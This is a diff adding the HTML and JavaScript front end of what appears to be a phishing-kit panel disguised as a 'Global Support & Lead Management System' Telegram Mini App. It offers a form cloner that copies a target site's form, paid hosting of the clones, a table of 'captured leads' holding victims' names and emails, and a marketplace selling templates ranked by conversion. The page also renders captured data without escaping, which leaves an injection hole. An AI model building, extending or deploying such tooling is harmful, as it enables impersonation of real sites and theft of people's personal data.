@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Global Support & Lead Management System</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    :root {
+      --deep-black: #0a0a0a;
+      --neon-green: #00ff41;
+      --cyber-purple: #8b5cf6;
+    }
+
+    body {
+      background: radial-gradient(circle at 10% 20%, rgba(139, 92, 246, 0.2), transparent 40%),
+                  radial-gradient(circle at 80% 0%, rgba(0, 255, 65, 0.12), transparent 40%),
+                  var(--deep-black);
+      color: #d1fae5;
+      min-height: 100vh;
+      overflow-x: hidden;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+    }
+
+    .glass {
+      background: rgba(15, 15, 20, 0.62);
+      border: 1px solid rgba(0, 255, 65, 0.26);
+      backdrop-filter: blur(12px);
+      box-shadow: 0 0 24px rgba(0, 255, 65, 0.14), inset 0 0 18px rgba(139, 92, 246, 0.15);
+    }
+
+    .scanlines::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background: repeating-linear-gradient(to bottom, transparent, transparent 2px, rgba(255, 255, 255, 0.02) 3px);
+      z-index: 40;
+    }
+
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 3px solid rgba(0, 255, 65, 0.2);
+      border-top-color: var(--neon-green);
+      border-radius: 999px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="scanlines">
+  <div id="bootLoader" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black">
+    <div class="loader mb-4"></div>
+    <p class="text-green-400 tracking-[0.35em] text-xs">INITIALIZING CYBER GRID...</p>
+  </div>
+
+  <main class="max-w-7xl mx-auto p-4 md:p-8 opacity-0 transition-opacity duration-700" id="appRoot">
+    <header class="glass rounded-2xl p-5 mb-5">
+      <div class="flex flex-wrap items-center justify-between gap-3">
+        <div>
+          <p class="text-xs text-purple-300">Telegram Mini App // Offensive Security UX</p>
+          <h1 class="text-2xl md:text-3xl font-bold text-green-300">Global Support & Lead Management System</h1>
+        </div>
+        <div class="text-right">
+          <p class="text-xs text-gray-400">Operator</p>
+          <p id="userTag" class="font-semibold text-green-300">u1001 / ZeroCool</p>
+          <p class="text-xs">Credits: <span id="creditCounter" class="text-purple-300">...</span></p>
+        </div>
+      </div>
+    </header>
+
+    <section class="grid lg:grid-cols-3 gap-5 mb-5">
+      <article class="glass rounded-2xl p-5 lg:col-span-2">
+        <h2 class="text-lg font-semibold text-green-300 mb-2">Dynamic Form Cloner</h2>
+        <p class="text-xs text-gray-300 mb-3">Deducts 3 credits per generation. Uses secure localhost internal analyzer.</p>
+        <div class="space-y-3">
+          <input id="sourceUrl" class="w-full bg-black/60 border border-green-500/40 rounded-lg px-3 py-2 text-sm" placeholder="https://example.com/support" />
+          <input id="formTitle" class="w-full bg-black/60 border border-purple-400/40 rounded-lg px-3 py-2 text-sm" placeholder="Optional title" />
+          <button id="cloneBtn" class="px-4 py-2 rounded-lg bg-green-500/20 border border-green-400 text-green-300 hover:bg-green-500/30">Generate Form (3 Credits)</button>
+          <p id="cloneStatus" class="text-xs text-gray-300"></p>
+        </div>
+      </article>
+
+      <article class="glass rounded-2xl p-5">
+        <h2 class="text-lg font-semibold text-purple-300 mb-2">Token Control</h2>
+        <ul class="space-y-2 text-sm">
+          <li class="flex justify-between"><span>Generate Form</span><span class="text-green-300">-3</span></li>
+          <li class="flex justify-between"><span>Host Form</span><span class="text-green-300">-30</span></li>
+        </ul>
+      </article>
+    </section>
+
+    <section class="grid xl:grid-cols-2 gap-5 mb-5">
+      <article class="glass rounded-2xl p-5">
+        <h2 class="text-lg font-semibold text-green-300 mb-3">My Forms</h2>
+        <div id="formsGrid" class="grid md:grid-cols-2 gap-3"></div>
+      </article>
+
+      <article class="glass rounded-2xl p-5">
+        <h2 class="text-lg font-semibold text-green-300 mb-3">Client Data (Database)</h2>
+        <div class="overflow-auto">
+          <table class="w-full text-xs border-collapse">
+            <thead>
+              <tr class="text-left text-purple-300 border-b border-purple-400/30">
+                <th class="py-2">User ID</th>
+                <th>Name</th>
+                <th>Email</th>
+                <th>Message</th>
+              </tr>
+            </thead>
+            <tbody id="clientDataTable"></tbody>
+          </table>
+        </div>
+      </article>
+    </section>
+
+    <section class="grid xl:grid-cols-2 gap-5">
+      <article class="glass rounded-2xl p-5">
+        <h2 class="text-lg font-semibold text-green-300 mb-3">Marketplace (Community Forms)</h2>
+        <div id="marketplaceList" class="space-y-3"></div>
+      </article>
+
+      <article class="glass rounded-2xl p-5">
+        <h2 class="text-lg font-semibold text-purple-300 mb-3">VIP Zone</h2>
+        <div id="vipList" class="space-y-3"></div>
+      </article>
+    </section>
+  </main>
+
+  <script>
+    const state = {
+      userId: 'u1001',
+      forms: []
+    };
+
+    function el(id) {
+      return document.getElementById(id);
+    }
+
+    async function api(url, options = {}) {
+      const response = await fetch(url, {
+        headers: { 'Content-Type': 'application/json' },
+        ...options
+      });
+
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Request failed');
+      return data;
+    }
+
+    function renderForms(forms) {
+      const container = el('formsGrid');
+      if (!forms.length) {
+        container.innerHTML = '<p class="text-xs text-gray-400">No forms generated yet.</p>';
+        return;
+      }
+
+      container.innerHTML = forms.map((form) => `
+        <div class="bg-black/50 border border-green-500/20 rounded-lg p-3">
+          <p class="text-sm text-green-300 font-semibold">${form.title}</p>
+          <p class="text-[11px] text-gray-400 truncate">${form.sourceUrl}</p>
+          <p class="text-[11px] mt-1">Fields: ${form.fields.length}</p>
+          <div class="mt-2 flex gap-2">
+            <button data-host="${form.id}" class="host-btn text-[11px] px-2 py-1 rounded bg-purple-500/20 border border-purple-400/40">Host (-30)</button>
+            <a href="/api/forms/${form.id}/download" target="_blank" class="text-[11px] px-2 py-1 rounded bg-green-600/20 border border-green-400/40">Download</a>
+          </div>
+        </div>
+      `).join('');
+
+      container.querySelectorAll('.host-btn').forEach((btn) => {
+        btn.addEventListener('click', async () => {
+          try {
+            await api(`/api/forms/${btn.dataset.host}/host`, {
+              method: 'POST',
+              body: JSON.stringify({ userId: state.userId })
+            });
+            await refreshAll();
+          } catch (error) {
+            alert(error.message);
+          }
+        });
+      });
+    }
+
+    function renderClientData(rows) {
+      const table = el('clientDataTable');
+      if (!rows.length) {
+        table.innerHTML = '<tr><td colspan="4" class="py-3 text-gray-400">No captured leads yet.</td></tr>';
+        return;
+      }
+
+      table.innerHTML = rows.map((row) => `
+        <tr class="border-b border-green-500/10">
+          <td class="py-2">${row.userId}</td>
+          <td>${row.name || '-'}</td>
+          <td>${row.email || '-'}</td>
+          <td>${row.message || '-'}</td>
+        </tr>
+      `).join('');
+    }
+
+    function renderMarketplace(templates) {
+      const container = el('marketplaceList');
+      container.innerHTML = templates.map((item) => `
+        <div class="bg-black/50 border border-green-500/20 rounded-lg p-3 flex items-center justify-between">
+          <div>
+            <p class="text-sm text-green-300">${item.title}</p>
+            <p class="text-[11px] text-gray-400">Seller: ${item.seller} | Conv: ${item.conversionScore}</p>
+          </div>
+          <button data-template="${item.id}" class="buy-btn text-xs px-3 py-1 rounded border border-green-500/40 bg-green-500/10">${item.price} Cr</button>
+        </div>
+      `).join('');
+
+      container.querySelectorAll('.buy-btn').forEach((btn) => {
+        btn.addEventListener('click', async () => {
+          try {
+            await api('/api/marketplace/purchase', {
+              method: 'POST',
+              body: JSON.stringify({ userId: state.userId, templateId: btn.dataset.template })
+            });
+            await refreshAll();
+          } catch (error) {
+            alert(error.message);
+          }
+        });
+      });
+    }
+
+    function renderVip(templates) {
+      const container = el('vipList');
+      container.innerHTML = templates.map((item) => `
+        <div class="bg-black/50 border border-purple-500/40 rounded-lg p-3">
+          <p class="text-sm text-purple-300">${item.title}</p>
+          <p class="text-[11px] text-gray-400">Class: ${item.classification}</p>
+          <p class="text-xs text-green-300 mt-1">${item.price} Credits</p>
+        </div>
+      `).join('');
+    }
+
+    async function refreshAll() {
+      const [profile, forms, leads, market, vip] = await Promise.all([
+        api(`/api/profile/${state.userId}`),
+        api(`/api/forms?userId=${state.userId}`),
+        api(`/api/client-data?userId=${state.userId}`),
+        api('/api/marketplace'),
+        api('/api/vip-zone')
+      ]);
+
+      el('creditCounter').textContent = profile.user.credits;
+      renderForms(forms.forms);
+      renderClientData(leads.records);
+      renderMarketplace(market.templates);
+      renderVip(vip.vipTemplates);
+    }
+
+    el('cloneBtn').addEventListener('click', async () => {
+      const sourceUrl = el('sourceUrl').value.trim();
+      const formTitle = el('formTitle').value.trim();
+      const status = el('cloneStatus');
+
+      if (!sourceUrl) {
+        status.textContent = 'Provide a target URL.';
+        return;
+      }
+
+      status.textContent = 'Cloning in progress...';
+
+      try {
+        const result = await api('/api/clone', {
+          method: 'POST',
+          body: JSON.stringify({ userId: state.userId, url: sourceUrl, title: formTitle })
+        });
+        status.textContent = result.message;
+        await refreshAll();
+      } catch (error) {
+        status.textContent = error.message;
+      }
+    });
+
+    window.addEventListener('load', async () => {
+      setTimeout(async () => {
+        el('bootLoader').classList.add('hidden');
+        el('appRoot').classList.remove('opacity-0');
+        await refreshAll();
+      }, 1200);
+    });
+  </script>
+</body>
+</html>
